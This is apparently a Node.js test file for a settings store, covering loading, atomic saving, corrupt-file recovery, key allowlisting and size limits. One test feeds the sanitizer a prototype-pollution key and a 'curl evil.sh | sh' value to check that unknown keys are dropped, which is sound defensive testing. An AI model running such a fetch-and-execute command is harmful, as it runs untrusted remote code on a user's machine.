'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { loadSettings, saveSettings, sanitizeSettings, ALLOWED_KEYS, MAX_STRING_BYTES } = require('../settings-store.js');

function tmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'verbatim-settings-'));
}

test('loadSettings returns parsed JSON on a valid file', () => {
  const dir = tmpDir();
  const file = path.join(dir, 'verbatim-settings.json');
  fs.writeFileSync(file, JSON.stringify({ hf_token: 'abc', data_dir: 'D:\\v' }));
  try {
    const { settings, corrupt_path } = loadSettings(file);
    assert.deepEqual(settings, { hf_token: 'abc', data_dir: 'D:\\v' });
    assert.equal(corrupt_path, null);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('loadSettings returns {} + null corrupt_path when the file is absent', () => {
  const dir = tmpDir();
  try {
    const { settings, corrupt_path } = loadSettings(path.join(dir, 'missing.json'));
    assert.deepEqual(settings, {});
    assert.equal(corrupt_path, null);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('loadSettings renames a corrupt file to .broken.json and warns', () => {
  const dir = tmpDir();
  const file = path.join(dir, 'verbatim-settings.json');
  const broken = path.join(dir, 'verbatim-settings.broken.json');
  fs.writeFileSync(file, '{not json at all');
  const warnings = [];
  try {
    const { settings, corrupt_path } = loadSettings(file, { warn: (...a) => warnings.push(a.join(' ')) });
    assert.deepEqual(settings, {});
    assert.equal(corrupt_path, broken);
    assert.ok(!fs.existsSync(file), 'corrupt file moved off the hot path');
    assert.ok(fs.existsSync(broken), '.broken sidecar written');
    assert.ok(warnings.some((w) => /malformed/.test(w)), 'warn called with malformed message');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('saveSettings writes atomically via tmp + rename', () => {
  const dir = tmpDir();
  const file = path.join(dir, 'verbatim-settings.json');
  try {
    saveSettings(file, { hf_token: 'x' });
    assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), { hf_token: 'x' });
    assert.ok(!fs.existsSync(file + '.tmp'), 'tmp file cleaned up after rename');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('saveSettings creates parent dirs on first run', () => {
  const dir = tmpDir();
  const file = path.join(dir, 'nested', 'userData', 'verbatim-settings.json');
  try {
    saveSettings(file, { data_dir: '/tmp' });
    assert.ok(fs.existsSync(file));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('sanitizeSettings drops unknown keys', () => {
  const out = sanitizeSettings({
    hf_token: 'abc',
    __proto__: 'pwned',
    malicious_rce: 'curl evil.sh | sh',
    nested: { evil: true },
    data_dir: '/tmp',
  });
  assert.deepEqual(Object.keys(out).sort(), ['data_dir', 'hf_token']);
});

test('sanitizeSettings drops non-string values for known keys', () => {
  const warnings = [];
  const out = sanitizeSettings(
    { hf_token: { object: true }, anthropic_api_key: 42, data_dir: '/tmp' },
    { warn: (m) => warnings.push(m) },
  );
  assert.deepEqual(out, { data_dir: '/tmp' });
  assert.ok(warnings.length >= 2, 'warned about each non-string');
});

test('sanitizeSettings truncates oversized string values', () => {
  const big = 'x'.repeat(MAX_STRING_BYTES * 3);
  const warnings = [];
  const out = sanitizeSettings({ hf_token: big }, { warn: (m) => warnings.push(m) });
  assert.equal(out.hf_token.length, MAX_STRING_BYTES);
  assert.ok(warnings.some((w) => /truncated/.test(w)));
});

test('saveSettings refuses payloads exceeding MAX_PAYLOAD_BYTES', () => {
  const dir = tmpDir();
  const file = path.join(dir, 'verbatim-settings.json');
  try {
    // Even a single sanitized string is capped at 8KB, so push multiple keys
    // just under that cap to exceed the 64KB total limit.
    const under = 'a'.repeat(MAX_STRING_BYTES);
    const payload = {};
    for (const key of ALLOWED_KEYS) payload[key] = under;
    assert.throws(() => saveSettings(file, payload), /size limit/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
